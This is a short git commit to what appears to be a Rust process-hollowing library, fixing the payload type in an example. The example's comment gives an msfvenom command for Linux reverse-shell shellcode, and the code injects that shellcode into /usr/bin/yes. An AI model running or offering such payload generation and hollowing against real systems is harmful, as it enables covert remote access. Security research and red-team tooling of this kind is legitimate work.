a07d318bb0f92ec5ff6f80718f836531af6aec5c
dustyw0lf <dustyw0lf@users.noreply.github.com>
2024-10-19 00:02:30 +0300

    Bugfix: Change payload type in the hollow example

--- examples/hollow.rs
+++ examples/hollow.rs
@@ -10,7 +10,7 @@ fn main() {
     // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
     let shellcode = format!("{}/examples/shellcode.bin", cwd);
 
-    let payload = Payload::from_file(&shellcode, PayloadType::Executable)
+    let payload = Payload::from_file(&shellcode, PayloadType::Shellcode)
         .set_target("/usr/bin/yes")
         .set_target_args("YES");
 
